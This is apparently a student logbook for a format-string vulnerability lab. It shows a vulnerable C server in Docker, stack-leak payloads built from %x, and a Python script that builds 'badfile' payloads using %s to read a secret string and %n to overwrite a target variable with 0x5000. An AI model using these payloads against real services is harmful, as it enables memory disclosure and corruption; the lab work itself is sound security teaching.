# Logbook 7
```c
unsigned int target = 0x11223344;
char *secret = "A secret message\n";
void myprintf(char *msg)
{
// This line has a format-string vulnerability
printf(msg);
}
int main(int argc, char **argv)
{
char buf[1500];
int length = fread(buf, sizeof(char), 1500, stdin);
printf("Input size: %d\n", length);
myprintf(buf);
return 1;
}
```
## Pre steps
- We executed the make file in servers

![Alt text](Images/1image-1.png)

 - We then built the docker

![Alt text](Images/1image.png)

 - In the next step we run the code that starts the server 

![Alt text](Images/image-1.png)

## Task 1
 - We tested the server using this code that was provided in the guide that sends Hello world to the server to the port 10.9.0.5 9090

![Alt text](Images/1image-2.png)

 - The output the server can shows a lot of stuff like it return properly and data that we will need in the next exercice

To crach the server we simply ran the this code that makes echo of %s using this code the server will try to access a string with an address mostly invalid wich will crach the printf

We can check that the function crashed because it didnt print the smiles

## Task 2 A
To check how many %x we can put in the input until we used this code to check when we can see 41 wich is hechadecimal to A we used this file with the name Payload2.txt
```txt
AAAA %x - %x - %x - %x - %x - %x - %x - %x - %x - A %x - %x - %x - %x - %x -A %x - %x - %x - %x - %x -A %x - %x - %x - %x - %x - A %x - %x - %x - %x - %x - A %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x - %x -1 %x
```

We can see four 41 in the last print of the server we needed 63 %x to get to the top of the input

## Task 2 B
To use we used this code wich was already mostly done with the name buil_string.py and we changed a little bit of the code 
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   63 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```
We runned the python code

![Alt text](Images/1image-8.png)

We executed the attack like this

![Alt text](Images/1image-7.png)

The output of the server was a success

![Alt text](Images/1image-9.png)

## Task 3 A

 - To change the memory in the addres we ran the previous python code that gives the address in binary 
 ```
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

 ```
  - we add abcd next to the address and the 63 %x and we have our payload


 ```
hPabcd%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n
 ```

 - We ran it and we got this response from the server

### Task 3 B

 - In this exercice we will make a little change we need to change the variable to 0x5000 wich is 20480 give that he %n counts how many bytes where writen we need to put in the printf 20480 - 4 (for the 4 characters writeen) - 8 * 62(each %.16x prints 16 characters) so we get 20480 - 16 *62 - 4 =  19484
 ```python
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("19900").encode('latin-1')

# This line shows how to construct a string s with
#20480 - 62 * 16 - 4= 19484
s = "%.16x"*62 + "%.19484x%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

 ```
 - This is the payload generated by the code with the address in the start is the address of the target variable and the value written in that palce is 16 * 62 + 19484 +4 = 20480 wich is 5000 in exadecimal
 ```
 hP%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.16x%.19484x%n
 ```
 - Here is the result of th output the target variable is changed to 0x00005000
